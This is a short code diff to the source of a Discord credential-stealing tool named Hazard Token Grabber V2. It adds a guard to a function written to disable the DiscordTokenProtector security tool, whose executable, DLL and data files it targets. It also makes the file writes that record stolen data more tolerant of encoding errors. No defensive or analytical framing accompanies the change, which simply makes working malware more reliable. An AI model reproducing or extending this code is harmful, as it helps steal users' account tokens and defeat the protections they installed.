@@ -184,6 +184,8 @@ class Hazard_Token_Grabber_V2(functions):
     async def bypassTokenProtector(self):
         # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        if not os.path.exists(tp):
+            return
         config = tp+"config.json"
 
         for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
@@ -435,10 +437,10 @@ class Hazard_Token_Grabber_V2(functions):
                         except PermissionError:
                             pass
                     else:
-                        with open(path, "w", encoding="utf-8") as f:
+                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
                                 "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
-                        with open(path, "a", encoding="utf-8") as fp:
+                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
                                 x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
         w = self.getProductValues()
